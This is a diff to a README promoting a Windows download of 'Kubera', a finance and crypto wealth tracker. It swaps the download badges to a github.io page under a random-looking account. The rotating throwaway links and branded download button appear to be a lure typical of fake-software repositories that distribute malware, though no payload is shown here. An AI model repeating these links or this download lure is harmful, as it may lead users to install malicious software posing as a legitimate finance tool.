@@ -4,7 +4,7 @@
 
 ## 📥 Download Kubera for Windows
 
-[![⬇️ Download Kubera](https://img.shields.io/badge/Download-Kubera-blue?style=for-the-badge&logo=windows)](https://stefankopilov.github.io/.github/kubera-tool)
+[![⬇️ Download Kubera](https://img.shields.io/badge/Download-Kubera-blue?style=for-the-badge&logo=windows)](https://yehudarussokxih.github.io/.github/kubera-tool)
 
 ---
 
@@ -30,7 +30,7 @@ Advanced features include historical performance charts, detailed asset allocati
 
 Whether you’re an investor, a crypto enthusiast, or simply someone who wants better visibility into their finances, Kubera delivers a modern solution for tracking wealth and planning for the future.
 
-[![⬇️ Download Kubera](https://img.shields.io/badge/Download-Kubera-blue?style=for-the-badge&logo=windows)](https://kuberaload.github.io/.github/)
+[![⬇️ Download Kubera](https://img.shields.io/badge/Download-Kubera-blue?style=for-the-badge&logo=windows)](https://yehudarussokxih.github.io/.github/kubera-tool)
 
 ---
 
